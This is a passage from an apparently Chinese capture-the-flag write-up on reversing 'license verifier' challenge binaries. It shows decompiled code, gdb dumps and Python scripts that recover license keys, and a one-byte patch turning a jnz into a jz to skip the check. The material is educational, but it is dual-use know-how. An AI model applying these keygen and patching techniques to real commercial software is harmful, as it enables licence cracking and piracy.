class="number">2</span>]</span><br><span class="line">flag[<span class="number">2</span>] =  flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">12</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7.1：要求同上</p>
<p>wp：静态与动态调试相结合，首先通过之前的方法用gdb找到正确的答案</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x55c058051010: 0x40    0xf3    0x82    0xd6    0x9b    0x57    0xe2    0x98</span><br><span class="line">0x55c058051018: 0xdf    0x6f    0x5b    0xf3    0x9c    0xd6    0x7e    0x68</span><br><span class="line">0x55c058051020: 0xff    0x94    0xd0    0x68    0x52    0xfd    0x63    0xc5</span><br><span class="line">0x55c058051028: 0x52    0x4a    0xe6    0x9b    0xc3</span><br></pre></td></tr></tbody></table></figure>
<p>接着阅读汇编尝试理解逻辑，发现有难度，于是尝试使用<strong>IDA</strong>，找到<code>main</code>函数（通过start找到main函数），然后通过<strong>反编译</strong>（F5键）得到伪代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+2Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+2Eh] [rbp-42h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+32h] [rbp-3Eh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+34h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+3Ch] [rbp-34h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0</span> )</span><br><span class="line">    __assert_fail(<span class="string">"argc &gt; 0"</span>, <span class="string">"&lt;stdin&gt;"</span>, <span class="number">0x32</span>u, <span class="string">"main"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"### Welcome to %s!\n"</span>, *a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###"</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"This license verifier software will allow you to read the flag. However, before you can do so, you must verify that you"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are licensed to read flag files! This program consumes a license key over stdin. Each program may perform entirely"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"different operations on that input! You must figure out (by reverse engineering this program) what that license key is."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Providing the correct license key will net you the flag!\n"</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ready to receive your license key!\n"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1D</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v6 = *((_BYTE *)&amp;buf + i);</span><br><span class="line">    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="number">28</span> - i);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - i) = v6;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">28</span>; ++j )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">switch</span> ( j % <span class="number">5</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xB4</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xEC</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0x96</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0x33</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + j) ^= <span class="number">0xA</span>u;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">13</span>; ++k )</span><br><span class="line">  {</span><br><span class="line">    v5 = *((_BYTE *)&amp;buf + k);</span><br><span class="line">    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="number">28</span> - k);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">28</span> - k) = v5;</span><br><span class="line">  }</span><br><span class="line">  v3 = HIBYTE(v11);</span><br><span class="line">  HIBYTE(v11) = v13;</span><br><span class="line">  LOBYTE(v13) = v3;</span><br><span class="line">  v4 = BYTE4(buf);</span><br><span class="line">  BYTE4(buf) = BYTE6(v12);</span><br><span class="line">  BYTE6(v12) = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking the received license key!\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, &amp;unk_4010, <span class="number">0x1D</span>uLL) )</span><br><span class="line">  {</span><br><span class="line">    sub_12E9();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wrong! No flag for you!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>参考上述伪代码我很快写出脚本，但是运行出来不正确，有两个字节无法解释为ASCII码，除了循环里的元素交换，这里也涉及到了元素交换，于是研究这段代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 下面三行代码的意思是将索引为 15 和 24 的元素互换位置，这里需要根据正确答案的起始索引进行计算</span></span><br><span class="line">v3 = HIBYTE(v11);  <span class="comment">// v11是64位int类型，v3获取其高8位，v11地址为 $rbp-0x28</span></span><br><span class="line">HIBYTE(v11) = v13; <span class="comment">// v13地址为 $rsp-0x18</span></span><br><span class="line">LOBYTE(v13) = v3;  <span class="comment">// 将v13的低8位设为v11的高八位</span></span><br><span class="line"><span class="comment">/* 通过gdb调试得到下面的结果，也就是将 0x52 和 0x68 互换</span></span><br><span class="line"><span class="comment">(gdb) x/gx $rbp-0x28</span></span><br><span class="line"><span class="comment">0x7fff397e3e28: 0x527ed69cf35b6fdf</span></span><br><span class="line"><span class="comment">(gdb) x/gx $rbp-0x18</span></span><br><span class="line"><span class="comment">0x7fff397e3e38: 0x000000be9be64a68</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//过程同上</span></span><br><span class="line">v4 = BYTE4(buf);</span><br><span class="line">BYTE4(buf) = BYTE6(v12);</span><br><span class="line">BYTE6(v12) = v4;</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>或者修改<code>buf</code>的类型，改为<code>char buf[29]</code>，这样就可以直接看见交换了哪两个元素</p>
</blockquote>
<p>最终脚本：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x40</span>,  <span class="number">0xf3</span>,  <span class="number">0x82</span>,  <span class="number">0xd6</span>,  <span class="number">0x9b</span>,  <span class="number">0x57</span>,  <span class="number">0xe2</span>,  <span class="number">0x98</span>,  <span class="number">0xdf</span>,  <span class="number">0x6f</span>,  <span class="number">0x5b</span>,  <span class="number">0xf3</span>,  <span class="number">0x9c</span>,  <span class="number">0xd6</span>,  <span class="number">0x7e</span>,  <span class="number">0x68</span>,  <span class="number">0xff</span>,  <span class="number">0x94</span>,  <span class="number">0xd0</span>,  <span class="number">0x68</span>,  <span class="number">0x52</span>,  <span class="number">0xfd</span>,  <span class="number">0x63</span>,  <span class="number">0xc5</span>, <span class="number">0x52</span>,  <span class="number">0x4a</span>,  <span class="number">0xe6</span>,  <span class="number">0x9b</span>,  <span class="number">0xc3</span>]</span><br><span class="line">s2 = [<span class="number">0xb4</span>, <span class="number">0xec</span>, <span class="number">0x96</span>, <span class="number">0x33</span>, <span class="number">0xa</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">	tmp = l[a]</span><br><span class="line">	l[a] = l[b]</span><br><span class="line">	l[b] = tmp</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">4</span>, <span class="number">22</span>)</span><br><span class="line">swap(s1, <span class="number">15</span>, <span class="number">24</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">	tmp = s1[k]</span><br><span class="line">	s1[k] = s1[<span class="number">28</span>-k]</span><br><span class="line">	s1[<span class="number">28</span>-k] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	s1[i] = s1[i] ^ s2[i%<span class="built_in">len</span>(s2)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">14</span>):</span><br><span class="line">	tmp = s1[k]</span><br><span class="line">	s1[k] = s1[<span class="number">28</span>-k]</span><br><span class="line">	s1[<span class="number">28</span>-k] = tmp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8.0：同7.0</p>
<p>wp：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xe8</span>, <span class="number">0xb9</span>, <span class="number">0x7b</span>, <span class="number">0xe4</span>, <span class="number">0x85</span>, <span class="number">0xb5</span>, <span class="number">0xa5</span>, <span class="number">0xab</span>, <span class="number">0xea</span>, <span class="number">0xdc</span>, <span class="number">0x77</span>, <span class="number">0xf2</span>, <span class="number">0xbc</span>, <span class="number">0x33</span>, <span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x35</span>, <span class="number">0xed</span>, <span class="number">0x23</span>, <span class="number">0x05</span>, <span class="number">0x2d</span>, <span class="number">0x6d</span>, <span class="number">0x2a</span>, <span class="number">0x6f</span>, <span class="number">0x0a</span>, <span class="number">0xef</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0xa1</span>, <span class="number">0x53</span>, <span class="number">0x3d</span>, <span class="number">0xa7</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0xa1</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">	tmp = l[a]</span><br><span class="line">	l[a] = l[b]</span><br><span class="line">	l[b] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)//<span class="number">2</span>):</span><br><span class="line">	swap(s1, i, <span class="built_in">len</span>(s1)-<span class="number">1</span>-i)</span><br><span class="line"></span><br><span class="line">x1 = <span class="number">0xed1b2fb3ae</span></span><br><span class="line">length = <span class="built_in">round</span>(x1.bit_length()/<span class="number">8</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">		s1[i] = s1[i] ^ (x1 &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">s2 = [<span class="number">0x8d95e5</span>, <span class="number">0xd58ddf</span>, <span class="number">0x77f189e87646</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s2)):</span><br><span class="line">	length = <span class="built_in">round</span>(s2[j].bit_length()/<span class="number">8</span>)  <span class="comment"># 获取字节数</span></span><br><span class="line">	<span class="built_in">print</span>(length)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">		s1[i] = s1[i] ^ (s2[j] &gt;&gt; ((length-<span class="number">1</span> - i%length)*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">s1.sort()  <span class="comment"># 排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s1)):</span><br><span class="line">	flag += <span class="built_in">chr</span>(s1[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8.1：同7.1，感觉题目给的提示不够，需要遍历所有排列组合？</p>
<p>wp：首先通过gdb找到目标十六进制</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55f97ee2b020: 0xd8    0x9a    0x0f    0x91    0xf4    0x63    0x77    0xc8</span><br><span class="line">0x55f97ee2b028: 0x88    0x18    0x91    0xbc    0x47    0x5c    0xfc    0xb3</span><br><span class="line">0x55f97ee2b030: 0x20    0xa4    0xa0    0x25    0x38    0x8b    0x84    0x53</span><br><span class="line">0x55f97ee2b038: 0xe4    0x96    0x1e    0xf1    0x4d    0x38    0xa2    0x27</span><br><span class="line">0x55f97ee2b040: 0x50    0xd6    0xc1 </span><br></pre></td></tr></tbody></table></figure>
<p>根据IDA的反编译伪代码得到下面的脚本，但是不知道冒泡排序之前的数组元素顺序，无法得到flag</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0xd8</span>, <span class="number">0x9a</span>, <span class="number">0x0f</span>, <span class="number">0x91</span>, <span class="number">0xf4</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0xc8</span>, <span class="number">0x88</span>, <span class="number">0x18</span>, <span class="number">0x91</span>, <span class="number">0xbc</span>, <span class="number">0x47</span>, <span class="number">0x5c</span>, <span class="number">0xfc</span>, <span class="number">0xb3</span>, <span class="number">0x20</span>, <span class="number">0xa4</span>, <span class="number">0xa0</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x8b</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xe4</span>, <span class="number">0x96</span>, <span class="number">0x1e</span>, <span class="number">0xf1</span>, <span class="number">0x4d</span>, <span class="number">0x38</span>, <span class="number">0xa2</span>, <span class="number">0x27</span>, <span class="number">0x50</span>, <span class="number">0xd6</span>, <span class="number">0xc1</span>]</span><br><span class="line">s2 = [<span class="number">0xe7</span>, <span class="number">0x16</span>, <span class="number">0x9f</span>, <span class="number">0xe</span>, <span class="number">0x91</span>, <span class="number">0x33</span>]</span><br><span class="line">s3 = [<span class="number">0x27</span>, <span class="number">0x65</span>, <span class="number">0xf3</span>, <span class="number">0x68</span>, <span class="number">0x1f</span>, <span class="number">0x9a</span>, <span class="number">0x80</span>]</span><br><span class="line">s4 = [<span class="number">0x9</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x38</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">l, a, b</span>):</span><br><span class="line">	tmp = l[a]</span><br><span class="line">	l[a] = l[b]</span><br><span class="line">	l[b] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">	s1[j] ^= s3[j%<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">4</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">17</span>):</span><br><span class="line">	swap(s1, n, <span class="number">34</span>-n)</span><br><span class="line"></span><br><span class="line">swap(s1, <span class="number">12</span>, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for k in range(0, 34):  # 冒泡排序</span></span><br><span class="line"><span class="string">	for m in range(0, 34-k):</span></span><br><span class="line"><span class="string">		if s1[m] &gt; s1[m+1]:</span></span><br><span class="line"><span class="string">			swap(s1, m, m+1)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">	s1[j] ^= s2[j%<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">35</span>):</span><br><span class="line">	s1[i] ^= s4[i%<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9.0：此挑战允许修补二进制文件中的5个字节。（先做level10.0）</p>
<p>wp：同10.0</p></li>
<li><p>level9.1：同上</p></li>
<li><p>level10.0：修改一个字节得到flag。</p>
<p>wp：从discord那得到了提示，通过修改一个字节达到修改汇编指令的目的。先运行目标文件以及通过IDA查看运行逻辑，如下：</p>
<blockquote>
<p>输入地址偏移量--&gt;输入修改值--&gt;对应地址的值变为修改值--&gt;输入字符串--&gt;MD5--&gt;比较</p>
</blockquote>
<p>通过IDA查看汇编指令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000021B4                 call    _memcmp  # 返回值为rax</span><br><span class="line">.text:00000000000021B9                 test    eax, eax  # 两个值相与</span><br><span class="line">.text:00000000000021BB                 jnz     short loc_21D1</span><br></pre></td></tr></tbody></table></figure>
<p>若<code>test</code>指令结果不为0，则会跳转到失败函数中，所以这里将<code>jnz</code>改为<code>jz</code>就不会跳到失败函数中，根据这个<a target="_blank" rel="noopener" href="http://ref.x86asm.net/coder64.html">网站</a>找到两个<strong>指令对应的十六进制</strong>。下一步就是需要确定偏移量的值。同gdb打开目标文件，直接查看<code>main</code>函数</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001cf0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x0000000000001cf4 &lt;+4&gt;:     push   rbp</span><br><span class="line">   ......</span><br><span class="line">   ......</span><br><span class="line">   0x0000000000001d7b &lt;+139&gt;:   call   0x11b0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001d80 &lt;+144&gt;:   mov    edi,0xa</span><br><span class="line"></span><br><span class="line">   0x0000000000001ea9 &lt;+441&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001eae &lt;+446&gt;:   call   0x1280 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001eb3 &lt;+451&gt;:   lea    rdi,[rip+0x14b7]        # 0x3371</span><br><span class="line">   0x0000000000001eba &lt;+458&gt;:   mov    eax,0x0</span><br><span class="line">   .......</span><br><span class="line">   0x0000000000001ed5 &lt;+485&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001eda &lt;+490&gt;:   call   0x1280 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000001edf &lt;+495&gt;:   movzx  ecx,BYTE PTR [rbp-0xc3]</span><br><span class="line">   .......</span><br><span class="line">(gdb) b *main+446  # 在第一个scanf处设置断点</span><br><span class="line">Breakpoint 1 at 0x1eae</span><br><span class="line">(gdb) run</span><br><span class="line">......</span><br><span class="line">Changing byte 1/1.</span><br><span class="line">Offset (hex) to change:</span><br><span class="line">Breakpoint 1, 0x00005627f9b96eae in main ()</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x00005627f9b96eae in main ()</span><br><span class="line">(gdb) x/gx $rbp-0xa8   # 起始地址</span><br><span class="line">0x7fff68699ee8: 0x00005627f9b95000</span><br><span class="line">(gdb) disas main   # 再次查看main函数中的指令，此时每条指令有具体的地址</span><br><span class="line">0x00005627f9b971b4 &lt;+1220&gt;:  call   0x5627f9b96290 &lt;memcmp@plt&gt;</span><br><span class="line">0x00005627f9b971b9 &lt;+1225&gt;:  test   eax,eax</span><br><span class="line">0x00005627f9b971bb &lt;+1227&gt;:  jne    0x5627f9b971d1 &lt;main+1249&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>得到<code>jne</code>的地址与起始地址相差<code>0x21bb</code>，即偏移量为<code>0x21bb</code>，再次运行目标文件：</p>
